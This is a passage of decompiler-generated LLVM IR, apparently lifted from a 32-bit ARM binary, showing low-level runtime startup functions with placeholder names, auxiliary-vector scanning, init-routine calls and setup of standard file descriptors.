  %v0_12f40 = load i32, i32* %r4.global-to-local, align 4
  %v1_12f40 = add i32 %v0_12f40, -1
  store i32 %v1_12f40, i32* %r4.global-to-local, align 4
  %v2_12f40 = icmp eq i32 %v0_12f40, 0
  br i1 %v2_12f40, label %dec_label_pc_12f48, label %dec_label_pc_12f34.dec_label_pc_12f34_crit_edge

dec_label_pc_12f34.dec_label_pc_12f34_crit_edge:  ; preds = %dec_label_pc_12f34
  %v0_12f34.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12f34

dec_label_pc_12f48:                               ; preds = %dec_label_pc_12f34
  %v4_12f4c = load i32, i32* @global_var_1e5e4.468, align 4
  %v2_12f50 = icmp eq i32 %v4_12f4c, 0
  br i1 %v2_12f50, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_12f48
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_12f48, %bb
  %v2_12f58 = xor i1 %v2_12f50, true
  call void @__pseudo_cond_branch(i1 %v2_12f58, i32 %v4_12f4c)
  %v4_12f60 = load i32, i32* @global_var_1e5e8.470, align 4
  %v2_12f64 = icmp eq i32 %v4_12f60, 0
  br i1 %v2_12f64, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_12f6c = xor i1 %v2_12f64, true
  call void @__pseudo_cond_branch(i1 %v2_12f6c, i32 %v4_12f60)
  %v2_12f70 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12f70, i32* %r4.global-to-local, align 4
  %v1_12f74 = load i32, i32* @r0, align 4
  ret i32 %v1_12f74

; uselistorder directives
  uselistorder i32 %v1_12f40, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_12f8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12f8c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_12fa0 = call i32 @function_1043c(i32 %arg1, i32 1)
  %v3_12fa8 = icmp eq i32 %v2_12fa0, -1
  store i32 123764, i32* @r3, align 4
  br i1 %v3_12fa8, label %dec_label_pc_12fb4, label %dec_label_pc_12fcc

dec_label_pc_12fb4:                               ; preds = %dec_label_pc_12f8c
  %v0_12fb8 = load i32, i32* %r5.global-to-local, align 4
  %v3_12fc0 = call i32 @function_101e0(i32 ptrtoint ([10 x i8]* @global_var_16040.473 to i32), i32 %v0_12fb8)
  %v1_12fc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_12fc8 = icmp ne i32 %v3_12fc0, %v1_12fc4
  call void @__pseudo_cond_branch(i1 %v1_12fc8, i32 ptrtoint (i32* @global_var_12320.474 to i32))
  br label %dec_label_pc_12fcc

dec_label_pc_12fcc:                               ; preds = %dec_label_pc_12f8c, %dec_label_pc_12fb4
  %v1_12fd4 = phi i32 [ %v2_12fa0, %dec_label_pc_12f8c ], [ %v3_12fc0, %dec_label_pc_12fb4 ]
  ret i32 %v1_12fd4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_12fcc, { 1, 0 }
}

define i32 @function_12fe0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12fe0:
  %r4.global-to-local = alloca i32, align 4
  store i32 123764, i32* %r4.global-to-local, align 4
  %v4_12ff0 = load i32, i32* inttoptr (i32 123856 to i32*), align 16
  %v1_12ff4 = inttoptr i32 %v4_12ff0 to i32*
  %v2_12ff4 = load i32, i32* %v1_12ff4, align 4
  %v2_12ff8 = icmp eq i32 %v2_12ff4, 0
  br i1 %v2_12ff8, label %dec_label_pc_13000, label %dec_label_pc_13034

dec_label_pc_13000:                               ; preds = %dec_label_pc_12fe0
  %v4_13004 = load i32, i32* inttoptr (i32 123816 to i32*), align 8
  %v2_1300c = icmp eq i32 %v4_13004, 0
  store i32 4096, i32* %v1_12ff4, align 4
  br i1 %v2_1300c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13000
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13000, %bb
  %v2_13018 = xor i1 %v2_1300c, true
  call void @__pseudo_cond_branch(i1 %v2_13018, i32 %v4_13004)
  %v0_13020 = load i32, i32* %r4.global-to-local, align 4
  %v2_13028 = icmp eq i32 %v0_13020, 41060
  br i1 %v2_13028, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_13030 = xor i1 %v2_13028, true
  call void @__pseudo_cond_branch(i1 %v2_13030, i32 ptrtoint (i32* @global_var_14310.479 to i32))
  br label %dec_label_pc_13034

dec_label_pc_13034:                               ; preds = %dec_label_pc_12fe0, %bb6
  %v1_13038 = load i32, i32* @r0, align 4
  ret i32 %v1_13038

; uselistorder directives
  uselistorder i1 %v2_13028, { 1, 0 }
  uselistorder label %dec_label_pc_13034, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_1304c(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1304c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_13054 = add i32 %tmp, 4
  store i32 %v1_13054, i32* %ip.global-to-local, align 4
  %v2_13058 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 123764, i32* @r6, align 4
  %v3_13064 = mul i32 %arg2, 4
  store i32 %v3_13064, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_1306c = load i32, i32* inttoptr (i32 123784 to i32*), align 8
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_13074 = ptrtoint i32* %stack_var_-120 to i32
  %v4_13078 = load i32, i32* inttoptr (i32 123792 to i32*), align 16
  store i32 %v4_13078, i32* %r4.global-to-local, align 4
  %v2_13080 = add i32 %v1_13054, %v3_13064
  store i32 %v2_13080, i32* %ip.global-to-local, align 4
  %v9_13084 = icmp eq i32 %v2_13080, %v2_13058
  store i1 %v9_13084, i1* %cpsr_z.global-to-local, align 1
  %v2_13088 = inttoptr i32 %v4_1306c to i32*
  store i32 %arg7, i32* %v2_13088, align 4
  store i32 628, i32* %r2.global-to-local, align 4
  %v0_13094 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_13084, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_1304c
  %v1_13098 = load i32, i32* @r7, align 4
  %v2_13098 = load i32, i32* %r5.global-to-local, align 4
  %v3_13098 = add i32 %v2_13098, %v1_13098
  store i32 %v3_13098, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_1e5e8.470, align 4
  %v0_130a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_130a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_130a0 = inttoptr i32 %v1_130a0 to i32*
  store i32 %v0_130a0, i32* %v2_130a0, align 4
  store i32 120, i32* @r2, align 4
  %v1_130ac = load i32, i32* %r3.global-to-local, align 4
  %v2_130ac = load i32, i32* %r4.global-to-local, align 4
  %v3_130ac = inttoptr i32 %v2_130ac to i32*
  store i32 %v1_130ac, i32* %v3_130ac, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_1304c
  store i32 %arg6, i32* @global_var_1e5e8.470, align 4
  %v0_130a0.c = load i32, i32* %ip.global-to-local, align 4
  %v1_130a0.c = load i32, i32* %r4.global-to-local, align 4
  %v2_130a0.c = inttoptr i32 %v1_130a0.c to i32*
  store i32 %v0_130a0.c, i32* %v2_130a0.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  %v2_130b8 = bitcast i32* %stack_var_-120 to i8*
  %v3_130b8 = call i32 @function_10a80(i8* %v2_130b8, i32 0)
  %v0_130bc = load i32, i32* %r4.global-to-local, align 4
  %v1_130bc = inttoptr i32 %v0_130bc to i32*
  %storemerge.pre = load i32, i32* %v1_130bc, align 4
  br label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %dec_label_pc_130c8, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_130c8, %dec_label_pc_130c8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_130c8 = inttoptr i32 %storemerge to i32*
  %v2_130c8 = load i32, i32* %v1_130c8, align 4
  store i32 %v2_130c8, i32* %r3.global-to-local, align 4
  %v4_130c8 = add i32 %storemerge, 4
  store i32 %v4_130c8, i32* %r2.global-to-local, align 4
  %v2_130cc = icmp eq i32 %v2_130c8, 0
  br i1 %v2_130cc, label %dec_label_pc_130d8, label %dec_label_pc_130c8

dec_label_pc_130d8:                               ; preds = %dec_label_pc_130c8
  store i32 %v4_130c8, i32* @r4, align 4
  store i32 %v2_13074, i32* @r5, align 4
  %v1_130fc29 = inttoptr i32 %v4_130c8 to i32*
  %v2_130fc30 = load i32, i32* %v1_130fc29, align 4
  store i32 %v2_130fc30, i32* %r3.global-to-local, align 4
  %v2_1310032 = icmp eq i32 %v2_130fc30, 0
  store i1 %v2_1310032, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1310032, label %dec_label_pc_13108, label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %dec_label_pc_130d8, %dec_label_pc_130fc
  %v5_130e8 = phi i32 [ %v2_130fc, %dec_label_pc_130fc ], [ %v2_130fc30, %dec_label_pc_130d8 ]
  %v2_130e4 = icmp ugt i32 %v5_130e8, 13
  %v7_130e4 = icmp eq i32 %v5_130e8, 14
  store i1 %v7_130e4, i1* %cpsr_z.global-to-local, align 1
  %v2_130e8 = xor i1 %v2_130e4, true
  %v3_130e8 = or i1 %v7_130e4, %v2_130e8
  br i1 %v3_130e8, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_130e4
  %v6_130e8 = and i32 %v5_130e8, 536870912
  %v7_130e8 = icmp ne i32 %v6_130e8, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_130e4, %bb58
  %v1_130f4 = phi i1 [ %v2_130e4, %dec_label_pc_130e4 ], [ %v7_130e8, %bb58 ]
  %v2_130ec = xor i1 %v1_130f4, true
  %v3_130ec = or i1 %v7_130e4, %v2_130ec
  br i1 %v3_130ec, label %bb60, label %dec_label_pc_130fc

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_130fc

dec_label_pc_130fc:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_130ec, i32 ptrtoint (i32* @global_var_10b30.484 to i32))
  %v0_130f8 = load i32, i32* @r4, align 4
  %v1_130f8 = add i32 %v0_130f8, 8
  store i32 %v1_130f8, i32* @r4, align 4
  %v1_130fc = inttoptr i32 %v1_130f8 to i32*
  %v2_130fc = load i32, i32* %v1_130fc, align 4
  store i32 %v2_130fc, i32* %r3.global-to-local, align 4
  %v2_13100 = icmp eq i32 %v2_130fc, 0
  store i1 %v2_13100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13100, label %dec_label_pc_13108, label %dec_label_pc_130e4

dec_label_pc_13108:                               ; preds = %dec_label_pc_130fc, %dec_label_pc_130d8
  %v1_1310c = call i32 @function_15514(i32 %v2_13074)
  store i32 %v1_1310c, i32* @r0, align 4
  %v1_13110 = call i32 @function_12fe0(i32 %v1_1310c)
  store i32 %v1_13110, i32* @r0, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_1311c = load i32, i32* @r6, align 4
  %v2_1311c = add i32 %v0_1311c, 92
  %v3_1311c = inttoptr i32 %v2_1311c to i32*
  %v4_1311c = load i32, i32* %v3_1311c, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_13124 = icmp eq i32 %tmp53, 0
  store i1 %v2_13124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13124, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_13108
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_13108, %bb61
  %v0_13130 = phi i32 [ %tmp53, %dec_label_pc_13108 ], [ 4096, %bb61 ]
  %v3_1312c = icmp eq i32 %tmp52, -1
  %v8_1312c = icmp eq i32 %tmp52, -1
  store i1 %v8_1312c, i1* %cpsr_z.global-to-local, align 1
  %v2_13130 = inttoptr i32 %v4_1311c to i32*
  store i32 %v0_13130, i32* %v2_13130, align 4
  br i1 %v3_1312c, label %dec_label_pc_13138, label %dec_label_pc_13160

dec_label_pc_13138:                               ; preds = %bb62
  %v0_13138 = call i32 @function_13450()
  store i32 %v0_13138, i32* @r0, align 4
  store i32 %v0_13138, i32* @r4, align 4
  %v0_13140 = call i32 @function_134ac()
  store i32 %v0_13140, i32* @r0, align 4
  %v0_13144 = load i32, i32* @r4, align 4
  %v9_13144 = icmp eq i32 %v0_13144, %v0_13140
  store i1 %v9_13144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13144, label %dec_label_pc_1314c, label %dec_label_pc_13188

dec_label_pc_1314c:                               ; preds = %dec_label_pc_13138
  %v1_1314c = call i32 @function_13618(i32 %v0_13140)
  store i32 %v1_1314c, i32* @r0, align 4
  store i32 %v1_1314c, i32* @r4, align 4
  %v0_13154 = call i32 @function_13498()
  store i32 %v0_13154, i32* @r0, align 4
  %v0_13158 = load i32, i32* @r4, align 4
  %v9_13158 = icmp eq i32 %v0_13158, %v0_13154
  store i1 %v9_13158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13158, label %dec_label_pc_13160, label %dec_label_pc_13188

dec_label_pc_13160:                               ; preds = %dec_label_pc_1314c, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_1312c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1312c, label %dec_label_pc_131ac, label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_13160
  store i32 %tmp51, i32* @r3, align 4
  %v9_13170 = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_13170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13170, label %dec_label_pc_13178, label %dec_label_pc_13188

dec_label_pc_13178:                               ; preds = %dec_label_pc_1316c
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_13180 = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_13180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13180, label %dec_label_pc_131ac, label %dec_label_pc_13188

dec_label_pc_13188:                               ; preds = %dec_label_pc_1316c, %dec_label_pc_1314c, %dec_label_pc_13138, %dec_label_pc_13178
  %v2_13190 = call i32 @function_12f8c(i32 0, i32 32768)
  %v2_1319c = call i32 @function_12f8c(i32 1, i32 32770)
  %v2_131a8 = call i32 @function_12f8c(i32 2, i32 32770)
  store i32 %v2_131a8, i32* @r0, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13178, %dec_label_pc_13160, %dec_label_pc_13188
  %v0_131ac = load i32, i32* @r7, align 4
  %v1_131ac = inttoptr i32 %v0_131ac to i32*
  %v2_131ac = load i32, i32* %v1_131ac, align 4
  store i32 %v2_131ac, i32* %r2.global-to-local, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  %v1_131b4 = load i32, i32* @r6, align 4
  %v3_131b4 = add i32 %v1_131b4, 208
  %v4_131b4 = inttoptr i32 %v3_131b4 to i32*
  store i32 %v2_131ac, i32* %v4_131b4, align 4
  %v0_131b8 = load i32, i32* @r7, align 4
  %v1_131b8 = inttoptr i32 %v0_131b8 to i32*
  %v2_131b8 = load i32, i32* %v1_131b8, align 4
  store i32 %v2_131b8, i32* @r4, align 4
  %v2_131bc = icmp eq i32 %v2_131b8, 0
  store i1 %v2_131bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_131bc, label %dec_label_pc_13260.lr.ph, label %dec_label_pc_131c4

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131ac
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_131c8 = load i32, i32* @r6, align 4
  %v2_131c8 = add i32 %v0_131c8, 112
  %v3_131c8 = inttoptr i32 %v2_131c8 to i32*
  %v4_131c8 = load i32, i32* %v3_131c8, align 4
  store i32 %v4_131c8, i32* %r3.global-to-local, align 4
  %v2_131cc = inttoptr i32 %v4_131c8 to i32*
  store i32 %v2_131b8, i32* %v2_131cc, align 4
  %v0_131d4 = load i32, i32* @r7, align 4
  %v1_131d4 = inttoptr i32 %v0_131d4 to i32*
  %v2_131d4 = load i32, i32* %v1_131d4, align 4
  %v4_131d8 = call i32 @function_15150(i32 %v2_131d4, i32 47, i32 %v2_131ac, i32 %v4_131c8)
  store i32 %v4_131d8, i32* @r0, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_131e0 = icmp eq i32 %v4_131d8, 0
  store i1 %v2_131e0, i1* %cpsr_z.global-to-local, align 1
  %v0_131e4 = load i32, i32* @r6, align 4
  %v2_131e4 = add i32 %v0_131e4, 60
  %v3_131e4 = inttoptr i32 %v2_131e4 to i32*
  %v4_131e4 = load i32, i32* %v3_131e4, align 4
  store i32 %v4_131e4, i32* %r2.global-to-local, align 4
  br i1 %v2_131e0, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_131c4
  %v2_131ec47 = inttoptr i32 %v4_131e4 to i32*
  store i32 0, i32* %v2_131ec47, align 4
  br label %dec_label_pc_13260.lr.ph

bb63:                                             ; preds = %dec_label_pc_131c4
  %v2_131e8 = add i32 %v4_131d8, 1
  store i32 %v2_131e8, i32* %r3.global-to-local, align 4
  %v2_131ec = inttoptr i32 %v4_131e4 to i32*
  store i32 %v4_131d8, i32* %v2_131ec, align 4
  %v1_131f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_131f0 = load i32, i32* %r2.global-to-local, align 4
  %v3_131f0 = inttoptr i32 %v2_131f0 to i32*
  store i32 %v1_131f0, i32* %v3_131f0, align 4
  br label %dec_label_pc_13260.lr.ph

dec_label_pc_13260.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_131ac
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_13208 = load i32, i32* @r6, align 4
  %v2_13208 = add i32 %v0_13208, -12
  store i32 %v2_13208, i32* %r8.global-to-local, align 4
  store i32 624, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_1e5e4.468, align 4
  %v2_13238 = icmp eq i32 %v0_13094, 0
  store i1 %v2_13238, i1* %cpsr_z.global-to-local, align 1
  %v2_13240 = xor i1 %v2_13238, true
  call void @__pseudo_cond_branch(i1 %v2_13240, i32 %v0_13094)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_13254 = load i32, i32* @r6, align 4
  %v2_13254 = add i32 %v0_13254, -12
  store i32 %v2_13254, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13260

dec_label_pc_13260:                               ; preds = %dec_label_pc_13260.dec_label_pc_13260_crit_edge, %dec_label_pc_13260.lr.ph
  %v1_13260 = phi i32 [ %v1_1326c, %dec_label_pc_13260.dec_label_pc_13260_crit_edge ], [ 0, %dec_label_pc_13260.lr.ph ]
  %v0_13260 = phi i32 [ %v0_13260.pre, %dec_label_pc_13260.dec_label_pc_13260_crit_edge ], [ %v2_13254, %dec_label_pc_13260.lr.ph ]
  %v4_13260 = mul i32 %v1_13260, 4
  %v5_13260 = add i32 %v4_13260, %v0_13260
  %v6_13260 = inttoptr i32 %v5_13260 to i32*
  %v7_13260 = load i32, i32* %v6_13260, align 4
  store i32 %v7_13260, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_13260)
  %v0_1326c = load i32, i32* %r4.global-to-local, align 4
  %v1_1326c = add i32 %v0_1326c, 1
  store i32 %v1_1326c, i32* %r4.global-to-local, align 4
  %v1_13270 = load i32, i32* %r5.global-to-local, align 4
  %v3_13270 = icmp ult i32 %v1_1326c, %v1_13270
  %v9_13270 = icmp eq i32 %v1_1326c, %v1_13270
  store i1 %v9_13270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13270, label %dec_label_pc_13260.dec_label_pc_13260_crit_edge, label %dec_label_pc_13278

dec_label_pc_13260.dec_label_pc_13260_crit_edge:  ; preds = %dec_label_pc_13260
  %v0_13260.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13260

dec_label_pc_13278:                               ; preds = %dec_label_pc_13260
  %v0_1327c.pre = load i32, i32* @r6, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_1327c = add i32 %v0_1327c.pre, 104
  %v3_1327c = inttoptr i32 %v2_1327c to i32*
  %v4_1327c = load i32, i32* %v3_1327c, align 4
  store i32 %v4_1327c, i32* %r2.global-to-local, align 4
  store i32 %v4_1327c, i32* %r3.global-to-local, align 4
  %v2_13284 = icmp eq i32 %v4_1327c, 0
  store i1 %v2_13284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13284, label %dec_label_pc_1329c, label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13278
  call void @__pseudo_branch(i32 %v4_1327c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13298 = load i32, i32* @r0, align 4
  %v2_13298 = inttoptr i32 %v1_13298 to i32*
  store i32 0, i32* %v2_13298, align 4
  %v0_132a0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1329c

dec_label_pc_1329c:                               ; preds = %dec_label_pc_13278, %dec_label_pc_1328c
  %v0_132a0 = phi i32 [ %v0_1327c.pre, %dec_label_pc_13278 ], [ %v0_132a0.pre, %dec_label_pc_1328c ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_132a0 = add i32 %v0_132a0, 80
  %v3_132a0 = inttoptr i32 %v2_132a0 to i32*
  %v4_132a0 = load i32, i32* %v3_132a0, align 4
  store i32 %v4_132a0, i32* %r2.global-to-local, align 4
  store i32 %v4_132a0, i32* %r3.global-to-local, align 4
  %v2_132a8 = icmp eq i32 %v4_132a0, 0
  store i1 %v2_132a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_132a8, label %dec_label_pc_132c0, label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_1329c
  call void @__pseudo_branch(i32 %v4_132a0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_132bc = load i32, i32* @r0, align 4
  %v2_132bc = inttoptr i32 %v1_132bc to i32*
  store i32 0, i32* %v2_132bc, align 4
  %v0_132c4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_132c0

dec_label_pc_132c0:                               ; preds = %dec_label_pc_1329c, %dec_label_pc_132b0
  %v0_132c4 = phi i32 [ %v0_132a0, %dec_label_pc_1329c ], [ %v0_132c4.pre, %dec_label_pc_132b0 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_132c4 = add i32 %v0_132c4, 28
  %v3_132c4 = inttoptr i32 %v2_132c4 to i32*
  %v4_132c4 = load i32, i32* %v3_132c4, align 4
  store i32 %v4_132c4, i32* %r3.global-to-local, align 4
  %v1_132cc = inttoptr i32 %v4_132c4 to i32*
  %v2_132cc = load i32, i32* %v1_132cc, align 4
  store i32 %v2_132cc, i32* %r2.global-to-local, align 4
  %v0_132d0 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_132dc = call i32 @function_12644(i32 %v0_132d0)
  %v0_132e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_132e0, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_132c0
  %v2_132e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_132e4 = load i32, i32* %r4.global-to-local, align 4
  %v8_132e4 = shl i32 %v2_132e4, %v1_132dc
  %v9_132e4 = and i32 %v8_132e4, %v1_132dc
  %v8_132e8 = shl i32 %v2_132e0, %v9_132e4
  %v9_132e8 = and i32 %v8_132e8, %v9_132e4
  %v3_132ec = load i32, i32* %r2.global-to-local, align 4
  %v4_132ec = lshr i32 %v2_132e4, %v3_132ec
  %v5_132ec = sub i32 32, %v3_132ec
  %v6_132ec = shl i32 %v2_132e4, %v5_132ec
  %v7_132ec = or i32 %v6_132ec, %v4_132ec
  %v9_132ec = and i32 %v9_132e8, %v7_132ec
  %v8_132f0 = ashr i32 %v2_132e0, %v9_132ec
  %v9_132f0 = and i32 %v8_132f0, %v9_132ec
  %v3_132f4 = and i32 %v9_132f0, %v3_132ec
  store i32 %v3_132f4, i32* %r8.global-to-local, align 4
  %v2_132f8 = inttoptr i32 %v9_132f0 to i64*
  %v3_132f8 = load i64, i64* %v2_132f8, align 4
  %v6_132f8 = udiv i64 %v3_132f8, 4294967296
  %v7_132f8 = trunc i64 %v6_132f8 to i32
  %v9_132f8 = sub i32 %v7_132f8, %v9_132f0
  %v5_132fc = sub i32 32, %v9_132f8
  %v6_132fc = shl i32 %v9_132f8, %v5_132fc
  %v9_132fc = and i32 %v6_132fc, %v9_132f8
  %v8_13300 = lshr i32 %v2_132e0, %v9_132fc
  %v9_13300 = and i32 %v8_13300, %v9_132fc
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_132c0, %bb64
  %v10_13300 = phi i32 [ %v1_132dc, %dec_label_pc_132c0 ], [ %v9_13300, %bb64 ]
  ret i32 %v10_13300

; uselistorder directives
  uselistorder i32 %v9_132f0, { 2, 1, 0 }
  uselistorder i32 %v2_132e4, { 1, 0, 2 }
  uselistorder i32 %v1_132dc, { 1, 0, 2 }
  uselistorder i32 %v0_1327c.pre, { 1, 0 }
  uselistorder i32 %v1_13270, { 1, 0 }
  uselistorder i32 %v1_1326c, { 3, 2, 1, 0 }
  uselistorder i32 %v4_131e4, { 1, 0, 2 }
  uselistorder i1 %v8_1312c, { 1, 2, 0 }
  uselistorder i32 %v2_130fc, { 1, 2, 0 }
  uselistorder i1 %v2_130e4, { 1, 0 }
  uselistorder i32 %v4_130c8, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_13094, { 1, 0 }
  uselistorder i32 %v3_13064, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 0, 13, 14, 15, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 8, 4, 0, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_12644, { 0, 3, 2, 1 }
  uselistorder i32 47, { 0, 5, 1, 6, 2, 7, 3, 8, 9, 4 }
  uselistorder i32 (i32, i32)* @function_12f8c, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1, 3 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_132c0, { 1, 0 }
  uselistorder label %dec_label_pc_1329c, { 1, 0 }
  uselistorder label %dec_label_pc_13260.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_131ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13188, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_130fc, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_130e4, { 1, 0 }
}

define i32 @function_13320(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13320:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13320 = load i32, i32* @r4, align 4
  store i32 %v3_13320, i32* %stack_var_-16, align 4
